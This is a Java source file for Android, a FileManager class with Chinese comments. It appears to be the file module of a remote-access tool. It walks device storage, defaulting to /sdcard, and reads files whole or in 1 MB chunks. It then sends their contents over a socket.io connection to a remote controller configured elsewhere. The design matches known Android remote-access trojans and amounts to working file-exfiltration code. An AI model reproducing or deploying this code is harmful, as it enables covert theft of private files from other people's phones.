package com.remote.app;

import android.os.Build;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.Arrays;
import java.util.Comparator;

/**
 * 文件管理器 - 处理文件列表和下载
 * 
 * 兼容 Android 11+ 分区存储
 * Android 14+ (API 34+) 更新
 */
public class FileManager {

    /**
     * 遍历目录并返回文件列表
     * 支持 Android 11+ 分区存储
     */
    public static JSONArray walk(String path) {
        JSONArray values = new JSONArray();
        
        try {
            // 验证路径
            if (path == null || path.isEmpty()) {
                path = "/sdcard";
            }
            
            Log.d(Config.LOG_TAG, "浏览目录: " + path);
            
            File dir = new File(path);
            
            // ========== 权限检查 ==========
            if (!dir.exists()) {
                Log.w(Config.LOG_TAG, "目录不存在: " + path);
                return createErrorResponse("目录不存在");
            }
            
            if (!dir.isDirectory()) {
                Log.w(Config.LOG_TAG, "路径不是目录: " + path);
                return createErrorResponse("路径不是目录");
            }
            
            if (!dir.canRead()) {
                Log.w(Config.LOG_TAG, "无读取权限: " + path);
                // Android 11+ 分区存储可能导致权限限制
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    Log.d(Config.LOG_TAG, "Android 11+ 可能需要 SAF 权限");
                }
                return createErrorResponse("无读取权限");
            }
            
            // ========== 获取文件列表 ==========
            File[] list = dir.listFiles();
            
            if (list == null) {
                Log.w(Config.LOG_TAG, "无法读取目录内容: " + path);
                return createErrorResponse("无法读取目录");
            }
            
            // ========== 排序文件 ==========
            Arrays.sort(list, new Comparator<File>() {
                @Override
                public int compare(File f1, File f2) {
                    // 目录优先
                    if (f1.isDirectory() && !f2.isDirectory()) return -1;
                    if (!f1.isDirectory() && f2.isDirectory()) return 1;
                    // 按名称排序
                    return f1.getName().compareToIgnoreCase(f2.getName());
                }
            });
            
            // ========== 添加父目录 ==========
            if (dir.getParent() != null) {
                JSONObject parentObj = new JSONObject();
                parentObj.put("name", "../");
                parentObj.put("isDir", true);
                parentObj.put("path", dir.getParent());
                parentObj.put("size", 0);
                values.put(parentObj);
            }
            
            // ========== 添加文件信息 ==========
            for (File file : list) {
                // 跳过隐藏文件
                if (file.getName().startsWith(".")) {
                    continue;
                }
                
                try {
                    JSONObject fileObj = new JSONObject();
                    fileObj.put("name", file.getName());
                    fileObj.put("isDir", file.isDirectory());
                    fileObj.put("path", file.getAbsolutePath());
                    fileObj.put("size", file.length());
                    fileObj.put("canRead", file.canRead());
                    fileObj.put("canWrite", file.canWrite());
                    fileObj.put("lastModified", file.lastModified());
                    values.put(fileObj);
                } catch (JSONException e) {
                    Log.w(Config.LOG_TAG, "添加文件信息失败: " + file.getName());
                }
            }
            
            Log.d(Config.LOG_TAG, "成功读取目录，共 " + (values.length() - 1) + " 项");
            
        } catch (Exception e) {
            Log.e(Config.LOG_TAG, "遍历目录异常: " + e.getMessage());
            e.printStackTrace();
            return createErrorResponse("异常: " + e.getMessage());
        }
        
        return values;
    }

    /**
     * 下载文件
     * 支持大文件分块传输
     */
    public static void downloadFile(String path) {
        if (path == null || path.isEmpty()) {
            sendErrorResponse("文件路径不能为空");
            return;
        }

        try {
            Log.d(Config.LOG_TAG, "下载文件: " + path);
            
            File file = new File(path);

            // ========== 验证文件 ==========
            if (!file.exists()) {
                Log.w(Config.LOG_TAG, "文件不存在: " + path);
                sendErrorResponse("文件不存在");
                return;
            }

            if (!file.isFile()) {
                Log.w(Config.LOG_TAG, "路径不是文件: " + path);
                sendErrorResponse("路径不是文件");
                return;
            }

            if (!file.canRead()) {
                Log.w(Config.LOG_TAG, "无读取权限: " + path);
                sendErrorResponse("无文件读取权限");
                return;
            }

            // ========== 检查文件大小 ==========
            long fileSize = file.length();
            Log.d(Config.LOG_TAG, "文件大小: " + formatFileSize(fileSize));
            
            // 超过 100MB 的文件分块传输
            final long CHUNK_SIZE = 1024 * 1024; // 1MB 分块
            
            if (fileSize > CHUNK_SIZE * 100) {
                downloadFileInChunks(file, CHUNK_SIZE);
            } else {
                downloadFileComplete(file);
            }

        } catch (Exception e) {
            Log.e(Config.LOG_TAG, "下载文件异常: " + e.getMessage());
            sendErrorResponse("下载异常: " + e.getMessage());
        }
    }

    /**
     * 完整文件下载（适合小文件）
     */
    private static void downloadFileComplete(File file) {
        try {
            int size = (int) file.length();
            byte[] data = new byte[size];
            
            BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
            int bytesRead = buf.read(data, 0, data.length);
            buf.close();
            
            if (bytesRead == size) {
                JSONObject object = new JSONObject();
                object.put("type", "download");
                object.put("name", file.getName());
                object.put("size", size);
                object.put("buffer", data);
                
                try {
                    IOSocket.getInstance().getIoSocket().emit(Config.MessageType.FILE_MANAGER, object);
                    Log.d(Config.LOG_TAG, "文件下载完成: " + file.getName());
                } catch (Exception e) {
                    Log.e(Config.LOG_TAG, "发送文件异常: " + e.getMessage());
                }
            } else {
                Log.w(Config.LOG_TAG, "文件读取不完整: 期望 " + size + "，实际 " + bytesRead);
                sendErrorResponse("文件读取不完整");
            }
            
        } catch (FileNotFoundException e) {
            Log.e(Config.LOG_TAG, "文件未找到: " + e.getMessage());
            sendErrorResponse("文件未找到");
        } catch (IOException e) {
            Log.e(Config.LOG_TAG, "文件读取异常: " + e.getMessage());
            sendErrorResponse("文件读取异常");
        } catch (JSONException e) {
            Log.e(Config.LOG_TAG, "JSON 序列化异常: " + e.getMessage());
            sendErrorResponse("序列化异常");
        }
    }

    /**
     * 分块下载大文件
     */
    private static void downloadFileInChunks(File file, long chunkSize) {
        try {
            long fileSize = file.length();
            int totalChunks = (int) Math.ceil((double) fileSize / chunkSize);
            
            Log.d(Config.LOG_TAG, "分块下载: " + file.getName() + " (" + totalChunks + " 块)");
            
            BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
            byte[] chunkData = new byte[(int) Math.min(chunkSize, fileSize)];
            
            for (int chunkIndex = 0; chunkIndex < totalChunks; chunkIndex++) {
                int bytesRead = buf.read(chunkData, 0, chunkData.length);
                
                if (bytesRead > 0) {
                    // 只发送实际读取的数据
                    byte[] actualData = new byte[bytesRead];
                    System.arraycopy(chunkData, 0, actualData, 0, bytesRead);
                    
                    JSONObject object = new JSONObject();
                    object.put("type", "download_chunk");
                    object.put("name", file.getName());
                    object.put("chunk", chunkIndex);
                    object.put("total_chunks", totalChunks);
                    object.put("size", bytesRead);
                    object.put("buffer", actualData);
                    
                    IOSocket.getInstance().getIoSocket().emit(Config.MessageType.FILE_MANAGER, object);
                    Log.d(Config.LOG_TAG, "已发送分块 " + (chunkIndex + 1) + "/" + totalChunks);
                }
            }
            
            buf.close();
            Log.d(Config.LOG_TAG, "分块下载完成: " + file.getName());
            
        } catch (Exception e) {
            Log.e(Config.LOG_TAG, "分块下载异常: " + e.getMessage());
            sendErrorResponse("分块下载异常: " + e.getMessage());
        }
    }

    /**
     * 发送错误响应
     */
    private static void sendErrorResponse(String error) {
        try {
            JSONObject errorJson = new JSONObject();
            errorJson.put("type", "error");
            errorJson.put("error", error);
            IOSocket.getInstance().getIoSocket().emit(Config.MessageType.FILE_MANAGER, errorJson);
        } catch (Exception e) {
            Log.e(Config.LOG_TAG, "发送错误响应异常: " + e.getMessage());
        }
    }

    /**
     * 创建错误响应 JSONArray
     */
    private static JSONArray createErrorResponse(String error) {
        JSONArray errorArray = new JSONArray();
        try {
            JSONObject errorJson = new JSONObject();
            errorJson.put("type", "error");
            errorJson.put("error", error);
            errorArray.put(errorJson);
        } catch (JSONException e) {
            Log.e(Config.LOG_TAG, "创建错误响应异常: " + e.getMessage());
        }
        return errorArray;
    }

    /**
     * 格式化文件大小
     */
    private static String formatFileSize(long bytes) {
        if (bytes <= 0) return "0 B";
        final String[] units = new String[]{"B", "KB", "MB", "GB", "TB"};
        int digitGroups = (int) (Math.log10(bytes) / Math.log10(1024));
        return String.format("%.1f %s", bytes / Math.pow(1024, digitGroups), units[digitGroups]);
    }
}
